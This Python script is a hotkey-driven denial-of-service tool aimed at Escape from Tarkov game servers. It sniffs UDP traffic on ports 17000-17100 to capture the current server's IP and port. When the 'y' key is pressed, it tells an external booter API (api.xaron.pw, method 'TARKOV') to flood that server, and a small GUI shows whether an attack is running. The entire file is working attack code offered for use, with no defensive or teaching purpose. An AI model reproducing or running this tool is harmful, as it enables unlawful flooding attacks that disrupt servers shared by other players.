from scapy.all import *
from pynput.keyboard import Key, Listener
from pprint import pprint
from datetime import datetime
from multiprocessing import Process
import functools
import requests
import winsound
import json
import time
import eel
import random

apiUrl = "https://api.xaron.pw/v2/tarkov?key=YOUR_PRIVATE_KEY"
currentIP = "0.0.0.0"
currentPort = 0
isAttacking = False
attackKey = "y"
sniffKey = "u"
currentAttackingIP = "0.0.0.0"
currentAttackingPort = 0
thread1 = None
thread2 = None
thread3 = None

eel.init("gui", allowed_extensions=[".html", ".js", ".ico"])

@eel.expose
def setCurrentIP(data):
    global currentIP, currentPort
    local = data[IP].dst[0:7]
    ip = data[IP].dst
    port = data[UDP].dport
    if local != "192.168": 
        if ip != currentIP:
            currentIP = ip
            currentPort = port
            eel.setCurrentIP(ip, port)
            print("New game server detected: {0}:{1}".format(ip, port))

def handleAttack(ip, port, action):
    global apiUrl, currentAttackingIP, currentAttackingPort
    if action == "start":
        currentAttackingIP = ip
        currentAttackingPort = port
        method = "TARKOV"
    else:
        method = "STOP"

    handle = requests.get("{0}&host={1}&port={2}&method={3}".format(apiUrl, currentAttackingIP, currentAttackingPort, method))
    handle = json.loads(handle.text)
    if handle["success"] == True:
        print(handle["message"])
        return True
    else:
        print(handle["message"])
        return False

@eel.expose
def on_press(key):
    global isAttacking, currentIP, currentPort, currentAttackingIP, currentAttackingPort
    if hasattr(key, "char"):
        if key.char == attackKey:
            if isAttacking:
                response = handleAttack(currentAttackingIP, currentAttackingPort, "stop")
                if response == True:
                    isAttacking = False
                    eel.setStatus(1)
                    winsound.Beep(500, 500)
            else:
                response = handleAttack(currentIP, currentPort, "start")
                if response == True:
                    isAttacking = True
                    eel.setStatus(2)
                    winsound.Beep(500, 500)
        elif key.char == sniffKey:
            startSniffing(True)

@eel.expose
def on_release(key):
    global currentIP, currentPort, currentAttackingIP, currentAttackingPort
    if key == Key.esc:
        handleAttack(currentIP, currentPort, "stop")
        handleAttack(currentAttackingIP, currentAttackingPort, "stop")
        eel.setStatus(1)
        print("User forced to stop exploit attack and close application.")
        supervisor()
        return False

@eel.expose
def startSniffing(user = False):
    if not user:
        print("Sniffing started")
    else:
        print("Re-sniffing started")

    sniff(filter = "udp and portrange 17000-17100", stop_filter = setCurrentIP, count = 3)

def supervisor():
    global thread1, thread2, thread3
    thread1.kill()
    time.sleep(0.3)
    thread2.kill()
    time.sleep(0.3)
    thread3.kill()
        

def startListening():
    with Listener(on_press = on_press, on_release = on_release) as listener:listener.join()

def startGui():
    eel.start("gui.html", size=(300, 200))

def threadedStart():
    global thread1, thread2, thread3
    print("[THREAD] Starting threads")
    thread1 = Process(target=startGui).start()
    thread2 = Process(target=startSniffing).start()
    thread3 = Process(target=startListening).start()

if __name__ == "__main__":
    threadedStart()
